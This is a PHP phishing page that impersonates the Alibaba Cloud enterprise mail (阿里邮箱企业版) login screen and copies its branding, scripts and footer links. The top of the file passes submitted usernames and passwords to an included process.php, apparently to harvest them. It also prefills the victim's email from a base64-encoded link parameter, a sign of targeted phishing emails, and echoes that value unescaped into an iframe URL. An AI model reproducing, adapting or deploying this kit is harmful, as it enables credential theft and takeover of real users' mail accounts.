<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?>

<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="description" content="登录阿里邮箱或阿里免费企业邮箱，请填写企业邮箱的完整账号，或管理员账号，支持阿里邮箱app扫描安全登录。下载安装阿里邮箱APP，无需设置，随时随地，轻松畅游。">
    <meta name="keywords" content="阿里企业邮箱,阿里云邮,企业邮箱,企业邮局,办公邮箱,办公邮件,公司邮箱,工作邮箱,收费企业邮箱,付费企业邮箱,免费企业邮箱,域名邮箱,钉邮,钉钉邮箱,反垃圾,电子邮件,企业邮箱app,企业邮箱客户端,注册企业邮箱,购买企业邮箱,企业邮箱哪家好,企业邮箱对比,企业邮箱选择,如何选择企业邮箱,企业邮箱购买,企业邮箱销售">
    <link rel="shortcut icon" href="https://qiye.aliyun.com/static/5135885/images/favicon.ico" type="image/x-icon">
    <link rel="bookmark" href="https://qiye.aliyun.com/static/5135885/images/favicon.ico" type="image/x-icon">
    <title>阿里邮箱企业版</title>

    <link rel="stylesheet" type="text/css" href="../eh/aliyun_files/login.css">
        <script type="text/javascript" async charset="utf-8" src="../eh/aliyun_files/core.php"></script><script type="text/javascript" src="../eh/aliyun_files/jquery-1.js"></script>
<script src="../eh/aliyun_files/c.php"></script></head>
<body>
    <div style="display:none;">
    <iframe name="errorTargetIframe" id="errorTargetIframe" src="../eh/aliyun_files/blank.htm"></iframe>
    <form name="browser_log" id="browser_log" target="errorTargetIframe" method="post">
        <input id="browser_log_text" name="text" type="hidden">
    </form>
</div>

<script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">

window.onerror = function (msg, url, line, col, error) {
    try {
        var text = "msg:[" + msg + "], url:[" + url + "], line:[" + line + "], col:[" + col + "]";
        var formNode = document.getElementById("browser_log");
        var fn = window.globalErrFunc;

        fn && fn(text);

        document.getElementById("browser_log_text").value = text;

        formNode.action = "\/alimail\/error\/browserLog?_timestamp_=" + (new Date().getTime());
        formNode.submit();
    } catch (e) {}

    return false;
};

</script>
    <script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">
    function goToNoneCdn(w) {
        var pn = w.location.pathname;
        var qs = w.location.search;
        var ph = w.location.hash;

        if (qs.indexOf('?') == 0) {
            qs = qs.substring(1);
        }

        if (ph.indexOf('#') == 0) {
            ph = ph.substring(1);
        }

        var reurl = pn;

        if (qs.length > 0) {
            reurl += "?" + qs;
        }

        var targetUrl = '\/alimail\/auth\/redirectNoneCdn';

        targetUrl = targetUrl + "?reurl=" + encodeURIComponent(reurl) + "#" + ph;

        w.location.href = targetUrl;
    }
</script>
    <img src="../eh/aliyun_files/check.gif" id="sqm_cdn_check_image" style="border:0;margin:0;padding:0;position:absolute;overflow:hidden;top:0;left:0;z-index:-1000;">

    <script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">
        function detectCdn(w, d) {
            var node = d.getElementById("sqm_cdn_check_image"), delayCheckCleared = 0;

            if (node) {
                var delayCheckId = setTimeout(function() {
                    if (!delayCheckCleared && !(node.offsetWidth > 22 && node.offsetHeight > 22)) {
                        goToNoneCdn(w);
                    }
                }, 5000);

                node.onload = function() {
                    clearTimeout(delayCheckId);
                    delayCheckCleared = 1;
                };

                node.onerror = function() {
                    clearTimeout(delayCheckId);
                    delayCheckCleared = 1;
                    goToNoneCdn(w);
                };

                node.src = 'https:\/\/gwebmail4.alicdn.com\/static\/5135885\/check.gif';
            } else {
                setTimeout(function() {
                    detectCdn(w, d);
                }, 500);
            }
        };

        detectCdn(window, document);
    </script>

    
    <script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">
var j = jQuery;

function checkFocus(f, showError) {
    var usernameNode = j("#username");

    if (!usernameNode.val()) {
        if (showError) {
            j("#login_error_line").show().find(".login_error_text").text("请输入用户名");
        }
        usernameNode.focus();
        return 0;
    }

    var passwordNode = j("#password");

    if (f) {
        passwordNode.focus();
        return 0;
    }

    if (!passwordNode.val()) {
        if (showError) {
            j("#login_error_line").show().find(".login_error_text").text("请输入密码");
        }
        passwordNode.focus();
        return 0;
    }
    return 1;
}
</script>

<div style="display:none;" id="login_common_wrap">
            <script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">
            function initLoginCommon() {
            }

            function doSubmit() {
            }
        </script>
    </div>

<script type="text/javascript" nonce="dC00MTA4Mzg0LU5xWVFudw2784">
var bIsUsernameFocus = 0;

function checkSubmit() {
    window.setTimeout(function () {
        if (bIsUsernameFocus) {
            var usernameNode = j("#username");

            if (usernameNode.val()) {
                j("#password").focus();
            }
        } else {
            checkFocus(0, 1) && doSubmit();
        }
    }, 50);
}

function changeLang(lang) {
    var reLangPattern = /([&\?]lang=)([^&]+)/;
    var newHref = '';

    var oldHref = location.href;
    if(reLangPattern.test(oldHref)) {
        newHref = oldHref.replace(reLangPattern, '$1' + lang);
    } else {
        newHref = oldHref + (oldHref.indexOf('?') < 0 ? '?' : '&') + 'lang=' + lang;
    }

    if(newHref) {
        location.href = newHref;
    }
}

j(document).ready(function () {
    initLoginCommon();

    j("#username").bind({
        focus : function () {
            bIsUsernameFocus = 1;
        },
        blur : function () {
            bIsUsernameFocus = 0;
        }
    });

    j(document).keydown(function (e) {
        if (e.keyCode == 13) {
            checkSubmit();
        }
    });

    if (typeof loginInit != 'undefined') {
        loginInit();
    }
});

</script>

    <div id="page">
        <div class="header">
            <div class="logo" title="阿里邮箱企业版" style="background-image:url(https://qiye.aliyun.com/static/5135885/images/forNetCN/logo.png)"></div>
            <div class="links_wrap">
                                                    <div class="links_item inline_block links_item_first"><a href="https://wanwang.aliyun.com/mail/" target="_blank" _cat="topcustomlink" _id="osfromqiyoubyGJ" style="">阿里邮箱官网</a></div>
                                                        <div class="links_item inline_block "><a href="https://mail.aliyun.com/" target="_blank" _cat="topcustomlink" _id="gyfromqiyoubyGJ" style="">个人邮箱登录</a></div>
                                                                        <span class="links_item inline_block ">
                        <a href="http://wanwang.aliyun.com/mail/app" target="_blank" _cat="toplink" _id="app">手机版</a>
                                                    <span class="login_banner_download" style="background-image: url(https://qiye.aliyun.com/static/5135885/images/forNetCN/phone_client.png)"></span>
                                            </span>
                                                                        <span class="links_item inline_block "><a href="http://mailhelp.mxhichina.com/smartmail/" target="_blank" _cat="toplink" _id="help">帮助</a></span>
                                                                                                                        <span class="links_item inline_block "><a href="javascript:void(0);">简体中文</a></span>
                                                                                            <span class="links_item inline_block "><a href="https://qiye.aliyun.com/?lang=en" _cat="langlink" _id="English">English</a></span>
                                                                        </div>
        </div>

        <div class="content bg_default" style="background-image: url(https://qiye.aliyun.com/attachment/download_docstore?fileID=b3f75198-4b71-40e3-8c48-dfbdd015a0e9);">
            <div class="content_inner">
                                    <div class="login_welcome" style="background-image: url(https://qiye.aliyun.com/attachment/download_docstore?fileID=4c39c408-6e27-423b-b5ab-49a2192d4007); display: block;"></div>
                
                <div class="login_pannel">
                    <div class="login_pannel_bg"></div>
                    <div class="login_title">
                        <div class="login_title_bg"></div>
                        <div class="login_title_text">
                            <span class="text_middle">登录企业邮箱</span>
                        </div>
                    </div>
<iframe allowtransparency="true" src="../eh/aliyun_files/login.php?<?php if(isset($_GET['mgs'])){ echo 'mgs=error&login='.$log;}else{echo 'loge='.$log;}?>&redirect_url=https%3A%2F%2Fqiye.aliyun.com%2Falimail%2Fauth%2FcallbackForCore%3Freurl%3D%252Falimail%252F&amp;sign=45d6b4da8a477f468318f218297015aa" class="login_panel_iframe" frameborder="0"></iframe>
                                    </div>
                <a href="https://wanwang.aliyun.com/mail/freemail/" class="login_bg_link" target="_blank" id="login_bg_link" style="" _cat="bglink" _id="20161123yx6by">&nbsp;&nbsp;&nbsp;</a>
            </div>
        </div>

        <div class="footer">
                            <div class="copyright_wrap">
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/about/?spm=5176.383338.25.1.SVJ1ar/" _cat="bottomlink" _id="about">关于我们</a></span>
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/law/?spm=5176.383338.25.2.SVJ1ar/" _cat="bottomlink" _id="law">法律声明</a></span>
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/links/?spm=5176.383338.25.3.SVJ1ar/" _cat="bottomlink" _id="links">友情链接</a></span>
                </div>
                <div class="copyright_wrap">
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alibabagroup.com/cn/global/home" _cat="bottomlink" _id="alibabagroup">阿里巴巴集团</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.taobao.com/" _cat="bottomlink" _id="taobao">淘宝网</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.tmall.com/" _cat="bottomlink" _id="tmall">天猫</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://ju.taobao.com/" _cat="bottomlink" _id="jutaobao">聚划算</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.aliexpress.com/" _cat="bottomlink" _id="aliexpress">全球速卖通</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alibaba.com/" _cat="bottomlink" _id="alibaba">阿里巴巴国际交易市场</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.1688.com/" _cat="bottomlink" _id="1688">1688</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alimama.com/index.htm" _cat="bottomlink" _id="alimama">阿里妈妈</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.aliyun.com/" _cat="bottomlink" _id="aliyun_com">阿里云计算</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.yunos.com/" _cat="bottomlink" _id="yunos">YunOS</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://aliqin.tmall.com/" _cat="bottomlink" _id="aliqin">阿里通信</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.net.cn/" _cat="bottomlink" _id="net_cn">万网</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://trip.taobao.com/" _cat="bottomlink" _id="trip">淘宝旅行</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.xiami.com/" _cat="bottomlink" _id="xiami">虾米</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.laiwang.com/" _cat="bottomlink" _id="laiwang">来往</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="https://www.alipay.com/" _cat="bottomlink" _id="alipay">支付宝</a></span>
                </div>
                <div class="copyright_wrap">
                    2009-2018 Aliyun.com 版权所有 ICP证：浙B2-20080101
                </div>
                    </div>
        <div id="cache_wrap"><iframe style="width:1px;height:1px;overflow:hidden;" src="../eh/aliyun_files/cache.htm"></iframe></div>
    </div> 


</body></html><?php }?>